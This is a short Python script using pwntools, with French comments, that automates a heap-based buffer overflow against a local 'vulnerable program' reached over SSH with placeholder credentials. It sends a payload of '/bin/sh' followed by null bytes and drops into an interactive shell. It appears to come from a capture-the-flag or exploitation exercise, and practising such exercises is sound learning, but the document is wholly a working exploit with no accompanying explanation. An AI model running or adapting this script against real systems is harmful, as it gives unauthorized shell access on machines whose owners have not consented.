# Script automatisant l'exploitation d'un Heap-Based Buffer Overflow
# Valeurs déduites sur GDB au préalable

from pwn import *

s = ssh(user='USER',host='HOTE',port=22,password='MDP')
p = s.process('./programme_vulnérable')

payload = b'/bin/sh\x00' + b'\x00'*48

p.sendline(payload)
p.interactive()
